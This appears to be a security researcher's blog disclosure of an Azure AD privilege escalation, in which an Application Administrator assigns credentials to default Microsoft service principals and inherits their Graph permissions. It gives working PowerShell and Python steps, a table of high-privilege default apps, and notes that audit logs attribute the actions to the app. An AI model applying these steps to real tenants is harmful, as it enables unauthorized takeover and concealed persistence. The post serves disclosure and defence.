---
layout: single
classes: wide
title:  "Azure AD privilege escalation - Taking over default application permissions as Application Admin"
date:   2019-09-16 21:08:57 +0200
---
During both my DEF CON and Troopers [talks](/talks/) I mentioned a vulnerability that existed in Azure AD where an Application Admin or a compromised On-Premise Sync Account could escalate privileges by assigning credentials to applications. When revisiting this topic I found out the vulnerability was actually not fixed by Microsoft, and that there are still methods to escalate privileges using default Office 365 applications. In this blog I explain the why and how. The escalation is still possible since this behaviour is considered to be "by-design" and thus remains a risk.

# Applications and Service Principals
In Azure AD there is a distinction between Applications and Service Principals. An application is the configuration of an application, whereas the Service Principal is the security object that can actually have privileges in the Azure Directory. This can be quite confusing as in the documentation they are usually both called applications. The Azure portal makes it even more confusing by calling Service Principals "Enterprise Applications" and hiding most properties of the service principals from view. For Office 365 and other Microsoft applications, the Application definition is present in one of Microsoft's dedicated Azure directories. In an Office 365 tenant, service principals are created for these applications automatically, giving an Office 365 Azure AD about 200 service principals by default that all have different pre-assigned permissions.

# Application roles
The way Azure AD applications work is that they can define roles, which can then be assigned to users, groups or service principals. If you read the documentation for the [Microsoft Graph permissions](https://docs.microsoft.com/en-us/graph/permissions-reference) you can see permissions such as `Directory.Read.All`. These are actually roles defined in the Microsoft Graph application, which can be assigned to service principals. In the documentation and Azure Portal, these roles are called "Application permissions", but we're sticking to the API terminology here. The roles defined in the Microsoft graph application can be queried using the AzureAD PowerShell module:

![Microsoft Graph roles](/assets/img/azuread/msgraphroles.png)

When we try to query for applications that have been assigned one or more roles, we can see that in my test directory the `appadmintest` app has a few roles assigned (though it's not exactly clear what roles that are since there's a lot of GUID references):

![Role assignments](/assets/img/azuread/msgraphapproleassignments.png)

There is however no way to query within an Azure AD which roles have been assigned to default Microsoft applications. So to enumerate this we have to get a bit creative. An Application Administrator (or the On-premise Sync account if you are escalating from on-premise to the cloud) can assign credentials to an application, after which this application can log in using the **client credential grant** OAuth2 flow. Assigning credentials is possible using PowerShell:

```powershell
PS C:\> $sp = Get-AzureADServicePrincipal -searchstring "Microsoft StaffHub"
PS C:\> New-AzureADServicePrincipalPasswordCredential -objectid $sp.ObjectId -EndDate "31-12-2099 12:00:00" -StartDate "6-8-2018 13:37:00" -Value redactedpassword


CustomKeyIdentifier :
EndDate             : 31-12-2099 12:00:00
KeyId               :
StartDate           : 6-8-2018 13:37:00
Value               : redactedpassword
```

After which we can log in using some python code and have a look at the issued access token. This JWT displays the roles the application has in the Microsoft Graph:


```python
import requests
import json
import jwt
import pprint

# This should include the tenant name/id
AUTHORITY_URL = 'https://login.microsoftonline.com/ericsengines.onmicrosoft.com'
TOKEN_ENDPOINT = '/oauth2/token'

data = {'client_id':'aa580612-c342-4ace-9055-8edee43ccb89',
        'resource':'https://graph.microsoft.com',
        'client_secret':'redactedpassword',
        'grant_type':'client_credentials'}

r = requests.post(AUTHORITY_URL + TOKEN_ENDPOINT, data=data)

data2 = r.json()

try:
    jwtdata = jwt.decode(data2['access_token'], verify=False)
    pprint.pprint(jwtdata)
except KeyError:
    pass
```

This will print the data from the token, containing the "Roles" field:

```json
{
 "aio": "42FgYJg946pl8aLnJXPOnn4zTe/mBwA=",
 "app_displayname": "Microsoft StaffHub",
 "appid": "aa580612-c342-4ace-9055-8edee43ccb89",
 "appidacr": "1",
 "aud": "https://graph.microsoft.com",
 "exp": 1567200473,
 "iat": 1567171373,
 "idp": "https://sts.windows.net/50ad18e1-bb23-4466-9154-bc92e7fe3fbb/",
 "iss": "https://sts.windows.net/50ad18e1-bb23-4466-9154-bc92e7fe3fbb/",
 "nbf": 1567171373,
 "oid": "56748bde-f24d-4a5b-aa2d-c88b175dfc80",
 "roles": ["Directory.ReadWrite.All",
           "Mail.Read",
           "Group.Read.All",
           "Files.Read.All",
           "Group.ReadWrite.All"],
 "sub": "56748bde-f24d-4a5b-aa2d-c88b175dfc80",
 "tid": "50ad18e1-bb23-4466-9154-bc92e7fe3fbb",
 "uti": "2GScBJopwk2e3EFce7pgAA",
 "ver": "1.0",
 "xms_tcdt": 1559139940
}
```

This method only seemed to work for the Microsoft Graph (and not for the Azure AD graph). I am unsure if this is because no apps have permissions on the Azure AD graph or if the system used for these permissions is different.

If we perform this action for all ~200 default apps in an Office 365 tenant, we get an overview of all the permissions these applications have. Below is an overview of the most interesting permissions that I've identified.

Application name | AppId | Access
--- | --- | ---
Microsoft Forms | c9a559d2-7aab-4f13-a6ed-e7e9c52aec87 | **Sites.ReadWrite.All**
Microsoft Forms | c9a559d2-7aab-4f13-a6ed-e7e9c52aec87 | **Files.ReadWrite.All**
Microsoft Cloud App Security | 05a65629-4c1b-48c1-a78b-804c4abdd4af | **Sites.ReadWrite.All**
Microsoft Cloud App Security | 05a65629-4c1b-48c1-a78b-804c4abdd4af | **Sites.FullControl.All**
Microsoft Cloud App Security | 05a65629-4c1b-48c1-a78b-804c4abdd4af | **Files.ReadWrite.All**
Microsoft Cloud App Security | 05a65629-4c1b-48c1-a78b-804c4abdd4af | **Group.ReadWrite.All**
Microsoft Cloud App Security | 05a65629-4c1b-48c1-a78b-804c4abdd4af | **User.ReadWrite.All**
Microsoft Cloud App Security | 05a65629-4c1b-48c1-a78b-804c4abdd4af | **IdentityRiskyUser.ReadWrite.All**
Microsoft Teams | 1fec8e78-bce4-4aaf-ab1b-5451cc387264 | **Sites.ReadWrite.All**
Microsoft StaffHub | aa580612-c342-4ace-9055-8edee43ccb89 | **Directory.ReadWrite.All**
Microsoft StaffHub | aa580612-c342-4ace-9055-8edee43ccb89 | **Group.ReadWrite.All**
Microsoft.Azure.SyncFabric | 00000014-0000-0000-c000-000000000000 | **Group.ReadWrite.All**
Microsoft Teams Services | cc15fd57-2c6c-4117-a88c-83b1d56b4bbe | **Sites.ReadWrite.All**
Microsoft Teams Services | cc15fd57-2c6c-4117-a88c-83b1d56b4bbe | **Group.ReadWrite.All**
Office 365 Exchange Online | 00000002-0000-0ff1-ce00-000000000000 | **Group.ReadWrite.All**
Microsoft Office 365 Portal | 00000006-0000-0ff1-ce00-000000000000 | **User.ReadWrite.All**
Microsoft Office 365 Portal | 00000006-0000-0ff1-ce00-000000000000 | **AuditLog.Read.All**
Azure AD Identity Governance Insights | 58c746b0-a0b0-4647-a8f6-12dde5981638 | **AuditLog.Read.All**
Kaizala Sync Service | d82073ec-4d7c-4851-9c5d-5d97a911d71d | **Group.ReadWrite.All**

So the TL;DR is that you compromise an Application Administrator account or the on-premise Sync Account you can read and modify directory settings, group memberships, user accounts, SharePoint sites and OneDrive files. This is done by assigning credentials to an existing service principal with these permissions and then impersonating these applications.

You can exploit this by assigning a password or [certificate](https://docs.microsoft.com/en-us/powershell/azure/active-directory/signing-in-service-principal?view=azureadps-2.0) to a service principal and then logging in as that service principal. I use Python for logging in with a service principal password since the PowerShell module doesn't support this (it does support certificates but that's more complex to set up).

The below command shows that when logging in with such a certificate, we do have the power to modify group memberships (something the application admin normally doesn't have):

```
PS C:\> add-azureadgroupmember -RefObjectId 2730f622-db95-4b40-9be7-6d72b6c1dad4 -ObjectId 3cf7196f-9d57-48ee-8912-dbf50803a4d8
PS C:\> Get-AzureADGroupMember -ObjectId 3cf7196f-9d57-48ee-8912-dbf50803a4d8

ObjectId                             DisplayName UserPrincipalName                 UserType
--------                             ----------- -----------------                 --------
2730f622-db95-4b40-9be7-6d72b6c1dad4 Mark        mark@bobswrenches.onmicrosoft.com Member
```

In the Azure AD audit log, the actions are shown as performed by "Microsoft StaffHub", and thus nothing in the log indicates these actions were actually performed by the application administrator. 

# Thoughts and disclosure process
I don't really see why credentials can be assigned to default service principals this way and what a possible legitimate purpose would be of this. In my opinion, it shouldn't be possible to assign credentials to first-party Microsoft applications. The Azure portal doesn't offer this option and does not display these "backdoor" service principals credentials, but the API's such as the Microsoft Graph and Azure AD Graph have no such limitations.

When I reported the fact that a privilege escalation is still possible this way (even after I was told it was fixed last year) I got a reply back from MSRC stating that Application Administrators assigning credentials to applications and obtaining more rights is documented and thus not a vulnerability.

If you are administering an Azure AD environment I recommend implementing checks for credentials being assigned to default service principals and to regularly review who control the credentials of applications with high privileges.
